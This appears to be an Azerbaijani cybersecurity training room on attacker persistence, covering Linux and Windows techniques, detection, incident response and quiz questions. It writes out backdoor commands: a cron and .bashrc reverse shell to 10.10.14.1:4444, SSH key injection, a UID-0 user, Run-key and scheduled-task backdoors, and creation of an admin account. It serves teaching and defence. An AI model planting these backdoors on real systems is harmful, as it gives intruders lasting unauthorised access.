# Room: Persistence (Girişi Saxlama)

**Path:** Post-Exploitation & Advanced Red Team
**Module:** Post-Exploitation
**Çətinlik:** Intermediate
**Təxmini vaxt:** 1 saat

## Room haqqında

Sistem ələ keçirilir, amma parol dəyişəndə, servis restart olanda, patch olanda giriş itir. Persistence — bu girişi saxlama sənətidir: sistemə "arxa qapılar" qoyaraq hücumçunun hər zaman qayıda bilməsini təmin etmək. Bu room-da persistence-in məqsədini, Linux/Windows-dakı sadə üsulları (cron, scheduled task, startup) konseptual öyrənəcəyik.

## Öyrənmə nəticələri

- Persistence-in məqsədini və hücum lifecycle-dəki yerini izah etmək
- Linux-da cron job/SSH açar persistence üsullarını bilmək
- Windows-da scheduled task/registry/startup üsullarını bilmək
- Hər üsulun aşkarlanma/təmizlənmə tərəfini anlamaq

## Task 1 — Niyə Persistence: Hücumun Zaman Ölçüsü

Reboot, restart, patch, parol dəyişmə, admin müdaxiləsi — əldə edilmiş giriş hər an itə bilər. İki ssenari:

- **Pentest:** client "hücumu simulyasiya edin" deyəndə əldə edilmiş girişin bir həftə sonra da işləməsi — sübutun gücüdür. Amma ROE adətən persistence-i məhdudlaşdırır/məcburi təmizləyir.
- **Real hücum (APT/incident):** hücum aylarla davam edir; ilk zəhərli qapı bağlananda hülumun davamı üçün onlarla alternativ qapı olmalıdır. APT hesabatlarında "persistence mechanism" hər zaman ayrıca göstərilir.

Persistence prinsipləri (hücumçu baxımı):

1. **Müxtəliflik:** bir yox, bir neçə qapı (biri tapan zaman digəri qalsın).
2. **Aşağı görünənlik:** startup-da sakit dayanan, şəbəkə yaratmayan, log qaldırmayan mexanizmlər.
3. **Bərpa oluna bilmə:** təmizlənməyə davamlı (bir qapı silinsə, digəri onu bərpa edir — malware "watchdog" mexanizmləri).
4. **Uyğun səviyyə:** istifadəçi səviyyəli persistence (sistemdə hesab var) vs SYSTEM/root səviyyəli (güclü, amma daha iz qoyur).

Müdafiə tərəfdə: **persistence aşkarlanması incident response-un ürəyidir.** Hücumçunun "getdiyini" düşünmək üçün onun bütün qapılarını tapmaq lazımdır — buna görə autostartlocation-ların monitoringi, MD5/hash müqayisələri, "baseline diff" müntəzəm auditlər müdafiənin standart praktikasıdır.

Bu room-da sadə üsullar (cron, task, startup, registry) — konseptual səviyyədə. Yadda saxlamaq: hər texnika həm hücum aləti, həm də adminin leqal alətidir; fərq məqsəddə və aşkarlanma kontekstindədir.

**Sual 1**
Pentest və real hücumda persistence-in rolu nə fərqlidir?

**Sual 2**
Persistence prinsiplərindən üçünü sadalayın.

**Sual 3.**
Niyə "hücumçunun getdiyini düşünmək" üçün bütün qapılar tapılmalıdır?

## Task 2 — Linux Persistence: Cron, SSH Açarları, Shell Profil

**1. Cron (klassik):** root imtiyazı əldə olunubsa — cron-da reverse shell/reconnect əmri:

```bash
# Hər 10 dəqiqədə kontrol (məsələn üçün):
crontab -e
*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
```

Və ya daha "sakit" variant: lokal SUID binary yaratmaq (privesc room-unun texnikası — irəlidə qayıtmaq üçün): cron-da `chmod +s /tmp/rootbash` əmri — hücumçu istədiyi vaxt `/tmp/rootbash -p` ilə root qayıdır.

**2. SSH authorized_keys:** ən sadə və "leqal görünən" üsul — istifadəçinin (root-un) `~/.ssh/authorized_keys`-inə öz public açarını əlavə et:

```bash
# attacker: ssh-keygen -f key
echo 'ssh-rsa AAAA...key...' >> /home/user/.ssh/authorized_keys
# sonradan: ssh -i key user@target  → birbaşa giriş
```

Şəbəkə trafiki yaratmır, proses yaratmır — yalnız bir sətir. Aşkarlanması: authorized_keys məzmununun monitorinqi.

**3. Shell profil (.bashrc/.profile):** login olanda icra olunan fayllara payload: `echo 'bash -i >& /dev/tcp/...' >> ~/.bashrc`. Admin login olanda shell açılır — amma hücumçunun istifadəçisi yox, qurban hesabı "zəhərlənir" (fərqli ssenari: hesabın özü istifadə olunanda aktivləşir).

**4. Systemd service/timer:** müasir Linux-da cron-un alternativi — service faylı `/etc/systemd/system/`-də; icra vaxtı/şərtləri timer ilə.

**5. İstifadəçi yaratma:** sadə, amma görünür: `useradd -o -u 0 -g 0 backdoor` (UID 0 — root kimi). `/etc/passwd`-də görünəndə dərhal bəlli olur (o cümlədən bu room-un oxucusuna: bu üsul lab-larda tapıla — real hücumda daha gizli variantlar seçilir).

Aşkarlanma (müdafiə): crontab diff-ləri, authorized_keys monitorinqi, .bashrc hash müqayisəsi, yeni istifadəçi auditləri (`/etc/passwd` changelog), auditd rules.

**Sual 1**
SSH açar persistence nə üçün "ən təmiz" sayılır?

**Sual 2.**
Cron-SUID kombinasiyası nə verir?

**Sual 3.**
.bashrc persistence-inin fərqli ssenarisi nədir?

## Task 3 — Windows Persistence: Registry, Tasks, Servis

**1. Registry Run açarları (ən klassik):** login olanda icra:

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\rev.exe"
```

HKCU — istifadəçi girişində; HKLM — hər login-də (admin tələb edir). Autostlokasiyası kimi tanınır — həm AV, hər admin də buraya baxır; buna baxmayaraq ən çox istifadə olunur (sadəliyinə görə).

**2. Scheduled Task:**

```cmd
schtasks /create /nl Backdoor /tr "C:\temp\rev.exe" /sc onlogon /ru SYSTEM
```

`/sc onlogon` — hər login-də SYSTEM kimi. Vaxtlı variantlar (`/sc minute /mo 30`) — periodik reconnect.

**3. Servis:** persistence + privesc birləşməsi (əvvəlki room-un `sc config` mexanizmi — qalıcı olaraq öz binary-ni servisə qoşmaq). Auto-start servis — reboot-dan sonra da yaşayır.

**4. Startup qovluğu:** `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` — buradakı fayllar login-də icra olunur; sadə, istifadəçi səviyyəli.

**5. WMI Event Subscription (gizli variant):** WMI hadisə abunəliyi (məs. "hər 60 saniyədə icra") — klassik autostart-lardan daha gizli; advanced hücum alətidir (konsept kimi qeyd olunur).

**6. Yeni istifadəçi / qrup üzvlüyü:** `net user backdoor P@ss /add && net localgroup administrators backdoor /add` — görünən, amma lab-larda klassik.

Windows persistence-in xüsusiyyəti — **çoxsaylı autostart lokasiyaları** (registry Run/RunOnce, Winlogon Shell/Userinit, Services, Tasks, Startup folder, WMI...) — hər biri həm fürsət, həm monitoring nöqtəsidir. Autoruns (Sysinternals) — bütün bu lokasiyaları siyahılayan məşhur alət; müdafiəçi üçün əsas, hücumçu üçün "harada görünəcəyəm" xəritəsi.

**Sual 1**
HKCU Run açarı ilə HKLM Run açarının fərqi nədir?

**Sual 2.**
Servis persistence privesc ilə necə birləşir?

**Sual 3.**
Autoruns aləti kimə və nəyə lazımdır?

## Task 4 — Aşkarlanma və İnkident Cavabı Perspektivi

Persistence hücumun ən "yavaş" hissəsidir — sistemdə qalır, gözləyir. Bu, onu həm müdafiə üçün ən yaxşı tutulma nöqtəsi, həm də hücum üçün ən kritik zəif halqa edir.

**Müdafiə monitorinqi (autostart səthinin qorunması):**

1. **Baseline diff:** təmiz sistemin autostart siyahısı (cron/registry/services) hash-lənib saxlanılır; müntəzəm diff — yeni/dəyişən elementlər siqnal verir.
2. **EDR davranışları:** autostart yazıları (registry Run dəyişikliyi = yüksək risk action), scheduled task yaradılışı SYSTEM üçün, WMI abunəlikləri.
3. **FIM (File Integrity Monitoring):** .bashrc, authorized_keys, startup folder-lər.
4. **İki tərəfli validasiya:** "niyə bu task var?" sualına cavabın olmaması = tapıntı.

**İnkident cavabında (IR) sıra:** hücum aşkarlananda — sadəcə "prosesi öldürmək" kifayət etmir; **bütün persistence qapıları tapılmalı və təmizlənməlidir.** Yol: (1) bütün autostart səthlərinin inventarı (Autoruns/winPEAS/manuel), (2) hər qeyri-standart elementin tədqiqi, (3) təmizləmə + parol rotate + credential sıfırlama, (4) davamlı izləmə. Qısa təmizləmə klassik səhvdir — hükomçunun "ehtiyat qapısı" qayıdış edir.

Bu room-un ROE/balans qeydi: lab və razılaşdırılmış pentest-də persistence qoyulması qaydaları əvvəlcədən müəyyənlaşdirilməlidir (real sistemdə qalıcı dəyişikliklər client-in icazəsini tələb edir; professional hesabatda qoyulan hər qapı siyahı ilə qeyd olunur və test sonu təmizlənir).

**Sual 1**
Baseline diff nə deməkdir?

**Sual 2.**
İR-də "sadəcə prosesi öldürmək" nə üçün səhvdir?

**Sual 3.**
Pentest-də persistence üçün hansı qayda var?

## Task 5 — Module Girişi: Post-Exploitation Dünyası

Bu room Post-Exploitation module-unun (7.1) ilk hissəsidir. Path-7-nin xəritəsi:

- **7.1 Post-Exploitation:** persistence (bu room) + data exfiltration (növbəti).
- **7.2 C2:** komanda-idarə framework-ləri (Cobalt Strike, Sliver) — "uzaqdan idarəetmənin mərkəzi platformaları".
- **7.3 Evasion:** AV/EDR-dən yayınma — "aşkarlanma qarşıdurması".

Post-exploitation-un privesc-dən fərqi — **zaman və məqsəd:** privesc "zirvəyə çıxmaq" (saatlarla), post-exploitation "zirvədə yaşamaq və iş görmək" (günlərlə/həftələrlə): məlumat toplamaq, hərəkəti davam etdirmək, nəticəni (data/etki) əldə etmək, aşkarlanmamaq.

Persistence bu dünyanın **təməl daşıdır**: onsuz bütün digər post-exploitation fəaliyyəti "bir gecəlik" olur. Real kampaniya log-larına baxanda (public APT report-ları) hər birində persistence mexanizmləri ilk addımlar sırasındadır.

Növbəti room — Data Exfiltration — "işin nəticəsi"ni (məlumatı) sistemdən çıxarma yollarına baxacaq: DNS tunneling, HTTP exfil kimi texnikalar və onların aşkarlanması. Persistence "qapıları saxlayır", exfiltration "malı çıxarır" — post-exploitation-un iki əsas məqsədi.

**Sual 1**
Post-exploitation privesc-dən nə ilə fərqlənir?

**Sual 2.**
Persistence post-exploitation-da hansı rolu daşıyır?

**Sual 3.**
Növbəti room nə ilə məşğul olacaq?
